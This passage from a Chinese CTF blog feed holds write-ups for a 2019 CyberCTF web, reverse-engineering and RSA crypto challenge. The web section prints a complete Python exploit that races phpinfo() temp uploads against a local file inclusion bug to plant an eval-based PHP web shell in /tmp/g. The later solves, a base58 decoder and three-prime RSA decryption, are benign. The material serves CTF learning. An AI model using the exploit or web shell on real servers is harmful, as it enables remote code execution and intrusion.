class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG="Security Test"</span><br><span class="line">    PAYLOAD="""%s\r</span><br><span class="line"><!--?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?-->')?>\r""" % TAG</span><br><span class="line">    REQ1_DATA="""-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span><br><span class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r""" % PAYLOAD</span><br><span class="line">    padding="A" * 5000</span><br><span class="line">    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r</span><br><span class="line">HTTP_ACCEPT: """ + padding + """\r</span><br><span class="line">HTTP_USER_AGENT: """+padding+"""\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: """+padding+"""\r</span><br><span class="line">HTTP_PRAGMA: """+padding+"""\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s""" %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    #modify this to suit the LFI script   </span><br><span class="line">    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="line">User-Agent: Mozilla/4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">"""</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = ""</span><br><span class="line">    while len(d) < offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i = d.index("[tmp_name] => ")</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(4096)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) != -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter >= self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+=1</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break                </span><br><span class="line">                if x:</span><br><span class="line">                    print "\nGot it! Shell created in /tmp/g"</span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    """Gets offset of tmp_name in the php output"""</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = ""</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i        </span><br><span class="line">        if i == "":</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith("0\r\n\r\n"):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find("[tmp_name] => ")</span><br><span class="line">    if i == -1:</span><br><span class="line">        raise ValueError("No php tmp_name in phpinfo output")</span><br><span class="line">    </span><br><span class="line">    print "found %s at %i" % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    print "LFI With PHPInfo()"</span><br><span class="line">    print "-=" * 30</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) < 2:</span><br><span class="line">        print "Usage: %s host [port] [threads]" % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print "Error with hostname %s: %s" % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    port=80</span><br><span class="line">    try:</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print "Error with port %d: %s" % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    poolsz=10</span><br><span class="line">    try:</span><br><span class="line">        poolsz = int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print "Error with poolsz %d: %s" % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print "Getting initial offset...",  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = 1000</span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print "Spawning worker pool (%d)..." % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter >= maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print "Woot!  \m/"</span><br><span class="line">        else:</span><br><span class="line">            print ":("</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print "\nTelling threads to shutdown..."</span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    print "Shuttin' down..."</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">if __name__=="__main__":</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/18.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/18.png" class="lazyload"></a></p><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/19.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/19.png" class="lazyload"></a></p><h3 id="（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）"><a href="#（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）" class="headerlink" title="（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）"></a>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）</h3><h3 id="先验证是否上传成功"><a href="#先验证是否上传成功" class="headerlink" title="先验证是否上传成功"></a>先验证是否上传成功</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/20.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/20.png" class="lazyload"></a></p><h3 id="嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell"><a href="#嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell" class="headerlink" title="嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell"></a>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell</h3><h3 id="于是-1"><a href="#于是-1" class="headerlink" title="于是"></a>于是</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/21.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/21.png" class="lazyload"></a></p><h3 id="flag应该在那个奇怪名字的文件里吧"><a href="#flag应该在那个奇怪名字的文件里吧" class="headerlink" title="flag应该在那个奇怪名字的文件里吧"></a>flag应该在那个奇怪名字的文件里吧</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/22.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/22.png" class="lazyload"></a></p><h3 id="果然，"><a href="#果然，" class="headerlink" title="果然，"></a>果然，</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/23.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/23.png" class="lazyload"></a></p><h3 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h3><h3 id="这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）"><a href="#这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）" class="headerlink" title="这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）"></a>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</h3><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="0x1-Secret"><a href="#0x1-Secret" class="headerlink" title="0x1 Secret"></a>0x1 <a href="secret">Secret</a></h2><h3 id="（emmm这一题偷懒了），"><a href="#（emmm这一题偷懒了），" class="headerlink" title="（emmm这一题偷懒了），"></a>（emmm这一题偷懒了），</h3><h3 id="首先分析主函数"><a href="#首先分析主函数" class="headerlink" title="首先分析主函数"></a>首先分析主函数</h3><h3 id="里面有两个check函数。进入checktime（）函数，关键代码是这里，"><a href="#里面有两个check函数。进入checktime（）函数，关键代码是这里，" class="headerlink" title="里面有两个check函数。进入checktime（）函数，关键代码是这里，"></a>里面有两个check函数。进入checktime（）函数，关键代码是这里，</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   *(&v5 + i) = rand();</span><br><span class="line">  if ( 14766 * v11 + 18242 * v10 + 4657 * v9 + 22453 * v8 + 7236 * v7 + 28554 * v6 + 25606 * v5 + 12289 * v12 == 12977737</span><br><span class="line">    && 27429 * v11 + 8015 * v10 + 16511 * v9 + 17180 * v8 + 27141 * v7 + 31813 * v6 + 7412 * v5 + 18249 * v12 == 15081473</span><br><span class="line">    && 2846 * v11 + 28353 * v10 + 19864 * v9 + 27377 * v8 + 9006 * v7 + 13657 * v6 + 19099 * v5 + 25835 * v12 == 13554960</span><br><span class="line">    && 1078 * v11 + 5007 * v10 + 6568 * v9 + 23034 * v8 + 10150 * v7 + 22949 * v6 + 32646 * v5 + 15255 * v12 == 11284005</span><br><span class="line">    && 8010 * v11 + 15430 * v10 + 6657 * v9 + 1009 * v8 + 25691 * v7 + 15960 * v6 + 19493 * v5 + 29491 * v12 == 10759932</span><br><span class="line">    && 4605 * v11 + 14468 * v10 + 5017 * v9 + 12805 * v8 + 22973 * v7 + 30584 * v6 + 12620 * v5 + 32085 * v12 == 12085266</span><br><span class="line">    && 7478 * v11 + 6524 * v10 + 25994 * v9 + 16215 * v8 + 12864 * v7 + 20574 * v6 + 8882 * v5 + 14794 * v12 == 11323393</span><br><span class="line">    && 15263 * v11 + 8821 * v10 + 25489 * v9 + 9598 * v8 + 26847 * v7 + 5175 * v6 + 6515 * v5 + 27411 * v12 == 11677607 )</span><br><span class="line">  {</span><br><span class="line">// 一共8位字符，猜测前5位位flag{然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）</span><br><span class="line">// 得到 flag{Th3</span><br><span class="line">// 然后来到关键的check函数，看到这里，</span><br><span class="line"> while ( 1 )</span><br><span class="line">  {</span><br><span class="line">    for ( j = 0; !v12[j]; ++j )</span><br><span class="line">      ;</span><br><span class="line">    if ( j >= v11 )</span><br><span class="line">      break;</span><br><span class="line">    v9 = 0;</span><br><span class="line">    while ( j < v11 )</span><br><span class="line">    {</span><br><span class="line">      v1 = (v9 << 8) + v12[j];</span><br><span class="line">      v12[j] = v1 / 58;</span><br><span class="line">      v9 = v1 % 58;</span><br><span class="line">      ++j;</span><br><span class="line">    }</span><br><span class="line">    v2 = v5++;</span><br><span class="line">    s[v2] = v9;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure></div><h3 id="再加上用来取值的table-123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy"><a href="#再加上用来取值的table-123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy" class="headerlink" title="再加上用来取值的table 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy"></a>再加上用来取值的table 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy</h3><h3 id="意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，"><a href="#意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，" class="headerlink" title="意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，"></a>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><!--?php</span--><br><span class="line"></span><br><span class="line">$encode = "fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g";</span><br><span class="line">echo "\n".$encode;</span><br><span class="line"></span><br><span class="line">$decode = base58_decode($encode);</span><br><span class="line">echo "\n".$decode;</span><br><span class="line"></span><br><span class="line">function base58_encode($string)</span><br><span class="line">{</span><br><span class="line">    $alphabet = '123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($string) === false || !strlen($string)) {</span><br><span class="line">        return false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $bytes = array_values(unpack('C*', $string));</span><br><span class="line">    $decimal = $bytes[0];</span><br><span class="line">    for ($i = 1, $l = count($bytes); $i < $l; ++$i) {</span><br><span class="line">        $decimal = bcmul($decimal, 256);</span><br><span class="line">        $decimal = bcadd($decimal, $bytes[$i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $output = '';</span><br><span class="line">    while ($decimal >= $base) {</span><br><span class="line">        $div = bcdiv($decimal, $base, 0);</span><br><span class="line">        $mod = bcmod($decimal, $base);</span><br><span class="line">        $output .= $alphabet[$mod];</span><br><span class="line">        $decimal = $div;</span><br><span class="line">    }</span><br><span class="line">    if ($decimal > 0) {</span><br><span class="line">        $output .= $alphabet[$decimal];</span><br><span class="line">    }</span><br><span class="line">    $output = strrev($output);</span><br><span class="line"></span><br><span class="line">    return (string) $output;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function base58_decode($base58)</span><br><span class="line">{</span><br><span class="line">    $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($base58) === false || !strlen($base58)) {</span><br><span class="line">        return false;</span><br><span class="line">    }</span><br><span class="line">    $indexes = array_flip(str_split($alphabet));</span><br><span class="line">    $chars = str_split($base58);</span><br><span class="line">    foreach ($chars as $char) {</span><br><span class="line">        if (isset($indexes[$char]) === false) {</span><br><span class="line">            return false;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    $decimal = $indexes[$chars[0]];</span><br><span class="line">    for ($i = 1, $l = count($chars); $i < $l; ++$i) {</span><br><span class="line">        $decimal = bcmul($decimal, $base);</span><br><span class="line">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span><br><span class="line">    }</span><br><span class="line">    $output = '';</span><br><span class="line">    while ($decimal > 0) {</span><br><span class="line">        $byte = bcmod($decimal, 256);</span><br><span class="line">        $output = pack('C', $byte).$output;</span><br><span class="line">        $decimal = bcdiv($decimal, 256, 0);</span><br><span class="line">    }</span><br><span class="line">    return $output;</span><br><span class="line">}</span><br></span></pre></td></tr></tbody></table></figure></div><h3 id="解码得到"><a href="#解码得到" class="headerlink" title="解码得到"></a>解码得到</h3><h3 id="sEcondBe5tTime1s-n0w"><a href="#sEcondBe5tTime1s-n0w" class="headerlink" title="sEcondBe5tTime1s_n0w}"></a>sEcondBe5tTime1s_n0w}</h3><h3 id="flag到手"><a href="#flag到手" class="headerlink" title="flag到手"></a>flag到手</h3><h3 id="后来发现，那这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check-time（）函数。。。"><a href="#后来发现，那这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check-time（）函数。。。" class="headerlink" title="后来发现，那这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。"></a>后来发现，那这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-NSCTF-2019年7月</title>
      <link href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/"/>
      <url>/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>划水划到了第四名，期间学到了很多，但是队伍因时间可能无法参加线下赛了，着实可惜。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x1-Rsa"><a href="#0x1-Rsa" class="headerlink" title="0x1 Rsa"></a><a href="RSA.rar">0x1 Rsa</a></h3><h3 id="在线网站http-factordb-com-分解N"><a href="#在线网站http-factordb-com-分解N" class="headerlink" title="在线网站http://factordb.com/ 分解N"></a>在线网站<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 分解N</h3><h3 id="发现三个素数"><a href="#发现三个素数" class="headerlink" title="发现三个素数"></a>发现三个素数</h3><h3 id="然后查阅文档-三素数rsa算法"><a href="#然后查阅文档-三素数rsa算法" class="headerlink" title="然后查阅文档 三素数rsa算法"></a>然后查阅文档 三素数rsa算法</h3><h3 id="发现和两个素数差不多，然后上脚本，解出hex-转str"><a href="#发现和两个素数差不多，然后上脚本，解出hex-转str" class="headerlink" title="发现和两个素数差不多，然后上脚本，解出hex 转str"></a>发现和两个素数差不多，然后上脚本，解出hex 转str</h3><h3 id="脚本如下："><a href="#脚本如下：" class="headerlink" title="脚本如下："></a>脚本如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import base64</span><br><span class="line">def gcd(a, b):   #求最大公约数</span><br><span class="line">    if a < b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception('modular inverse does not exist')</span><br><span class="line">    else:</span><br><span class="line">        return x % m</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    p=810971978554706690040814093</span><br><span class="line">    q=782758164865345954251810941</span><br><span class="line">    r=1108609086364627583447802163</span><br><span class="line">    e = 59159</span><br><span class="line">    # tmp = base64.b64decode("qzogS7X8M3ZOpkUhJJcbukaRduLyqHAPblmabaYSm9iatuulrHcEpBmil7V40N7gbsQXwYx5EBH5r5V2HRcEIOXjgfk5vpGLjPVxBLyXh2DajHPX6KvbFpQ8jNpCQbUNq8Hst00yDSO/6ri9dk6bk7+uyuN0b2K1bNG5St6sCQ4qYEA3xJbsHFvMqtvUdhMiqO7tNCUVTKZdN7iFvSJqK2IHosIf7FqO24zkHZpHi31sYU7pcgYEaGkVaKs8pjq6nbnffr4URfoexZHeQtq5UAkr95zD6WgvGcxaTDKafFntboX9GR9VUZnHePiio7nJ3msfue5rkIbISjmGCAlj+w==")</span><br><span class="line">    #  = </span><br><span class="line">    d = modinv(e, (p - 1)*(r-1)*(q-1))</span><br><span class="line">    # c=s2n(tmp)</span><br><span class="line">    c = 449590107303744450592771521828486744432324538211104865947743276969382998354463377</span><br><span class="line">    #c = 225031483444634056931067907865853799650197225351377050632290334721073031287701730297815850654473721939907812470206115171738967740183098960272963323728747481560137205796840356532306950935686580268408289864109695494835661414073083573249882362332920722000099781994315336570711188934565379141406727420346806389405536474102730682155998263607095718543239272202402139286809779368710600842078606046563228470023546348908618719147790859257980882643030144242048154566691808688844513142261099020381730517293884263384819159874220288293023868919557980548807831273449743064237407705987056818011286315950476959812697067649075359373253</span><br><span class="line">    n = p*q*r</span><br><span class="line">    m=pow(c,d,n)</span><br><span class="line">    print (hex(m))</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/1.png" class="lazyload"></a></p><h3 id="转化为ascii即为flag"><a href="#转化为ascii即为flag" class="headerlink" title="转化为ascii即为flag"></a>转化为ascii即为flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title 